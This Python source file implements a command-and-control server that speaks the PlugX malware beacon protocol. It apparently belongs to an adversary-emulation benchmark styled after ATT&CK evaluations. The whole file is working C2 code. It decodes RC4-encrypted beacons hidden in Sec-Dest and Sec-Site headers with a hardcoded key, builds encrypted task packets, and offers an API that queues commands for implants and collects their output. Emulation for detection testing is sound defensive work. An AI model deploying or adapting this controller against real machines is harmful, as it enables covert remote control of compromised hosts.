"""PlugX C2 server for bench_v4 AEL-MUSTANG-PANDA-PLUGX-001.

Implements the PlugX beacon protocol:
  - GET /  with Sec-Dest (implant ID) and Sec-Site (base64 RC4-encrypted beacon)
  - First beacon returns "success", subsequent beacons return task packets
  - Task packet: RC4-encrypted, base64-encoded binary
    (uint32 id + uint32 argLength + uint32 contentLength + args + content)
  - RC4 key: "secret_key"

REST API (same port, path-based routing):
  - GET  /api/v1.0/sessions           — list sessions
  - GET  /api/v1.0/task/{guid}         — get task for session
  - POST /api/v1.0/task/{guid}         — set task for session
  - GET  /api/v1.0/task/output/{guid}  — get task output
  - GET  /api/v1.0/version             — version string
"""
from __future__ import annotations
import base64
import json
import os
import struct
import threading
import time
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

ENCRYPTION_KEY = b"secret_key"
HANDLER_PORT = int(os.environ.get("PLUGX_PORT", "18451"))
RESULTS_LOG = os.environ.get("PLUGX_RESULTS_LOG", "/tmp/c2trace-plugx/results.log")

_sessions: dict[str, dict] = {}
_sessions_lock = threading.Lock()
_tasks: dict[str, str] = {}
_output: dict[str, str] = {}


def _rc4(data: bytes, key: bytes = ENCRYPTION_KEY) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def _build_packet(task_id: int, args: str, content: bytes = b"") -> bytes:
    arg_bytes = args.encode() + b"\x00" if args else b""
    arg_len = len(arg_bytes)
    content_len = len(content)
    return struct.pack("<III", task_id, arg_len, content_len) + arg_bytes + content


def _parse_packet(data: bytes) -> tuple[int, str, bytes]:
    if len(data) < 12:
        return 0, "", b""
    task_id, arg_len, content_len = struct.unpack("<III", data[:12])
    offset = 12
    args = ""
    if arg_len > 0 and offset + arg_len <= len(data):
        args = data[offset:offset + arg_len].rstrip(b"\x00").decode("utf-8", errors="replace")
        offset += arg_len
    content = b""
    if content_len > 0 and offset + content_len <= len(data):
        content = data[offset:offset + content_len]
    return task_id, args, content


class PlugXHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, fmt, *args):
        with open(RESULTS_LOG, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] {fmt % args}\n")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/v1.0/version":
            self._text(200, "ATT&CK Evaluations Control Server 1.0")
            return
        if path == "/api/v1.0/sessions":
            with _sessions_lock:
                data = json.dumps([{"guid": k, "data": v} for k, v in _sessions.items()])
            self._text(200, data)
            return
        parts = path.strip("/").split("/")
        if len(parts) == 3 and parts[0] == "api" and parts[1] == "v1.0":
            if parts[2] == "sessions":
                with _sessions_lock:
                    data = json.dumps([{"guid": k, "data": v} for k, v in _sessions.items()])
                self._text(200, data)
                return
        if len(parts) == 4 and parts[0] == "api" and parts[1] == "v1.0" and parts[2] == "task":
            guid = parts[3]
            if guid in _tasks:
                self._text(200, _tasks[guid])
            else:
                self._text(200, "")
            return
        if len(parts) == 5 and parts[0] == "api" and parts[1] == "v1.0" and parts[2] == "task" and parts[3] == "output":
            guid = parts[4]
            self._text(200, _output.get(guid, ""))
            return

        # PlugX beacon endpoint
        if path == "/":
            implant_id = self.headers.get("Sec-Dest", "")
            beacon_data_enc = self.headers.get("Sec-Site", "")
            if implant_id:
                if beacon_data_enc and beacon_data_enc != implant_id:
                    try:
                        raw = base64.b64decode(beacon_data_enc)
                        decrypted = _rc4(raw)
                        tid, args, content = _parse_packet(decrypted)
                        with open(RESULTS_LOG, "a") as f:
                            f.write(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] Reply from implant {implant_id}: tid={tid} args={args}\n")
                        if tid > 0 or content:
                            output_str = content.decode("utf-8", errors="replace") if content else decrypted.decode("utf-8", errors="replace")
                            if output_str and len(output_str) > 2:
                                _output[implant_id] = output_str
                    except Exception:
                        pass
                with _sessions_lock:
                    if implant_id not in _sessions:
                        _sessions[implant_id] = {"guid": implant_id, "first_seen": time.strftime("%Y-%m-%dT%H:%M:%S")}
                        with open(RESULTS_LOG, "a") as f:
                            f.write(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] New session: {implant_id}\n")
                        self._text(200, "success")
                        return
                task_str = _tasks.get(implant_id, "")
                if task_str:
                    task_id, task_args = 1, task_str
                    packet = _build_packet(task_id, task_args)
                    encrypted = _rc4(packet)
                    encoded = base64.b64encode(encrypted).decode()
                    self._text(200, encoded)
                    return
                packet = _build_packet(0, "")
                encrypted = _rc4(packet)
                encoded = base64.b64encode(encrypted).decode()
                self._text(200, encoded)
                return
            self._text(404, "Not Found")
            return
        self._text(404, "Not Found")

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        parts = path.strip("/").split("/")
        if len(parts) == 4 and parts[0] == "api" and parts[1] == "v1.0" and parts[2] == "task":
            guid = parts[3]
            content_len = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_len).decode("utf-8", errors="replace") if content_len else ""
            _tasks[guid] = body
            self._text(200, "ok")
            return
        self._text(404, "Not Found")

    def _text(self, code, body):
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        self.wfile.write(data)


def main():
    os.makedirs(os.path.dirname(RESULTS_LOG), exist_ok=True)
    open(RESULTS_LOG, "w").close()
    server = ThreadingHTTPServer(("0.0.0.0", HANDLER_PORT), PlugXHandler)
    with open(RESULTS_LOG, "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] PlugX C2 server listening on port {HANDLER_PORT}\n")
    server.serve_forever()


if __name__ == "__main__":
    main()
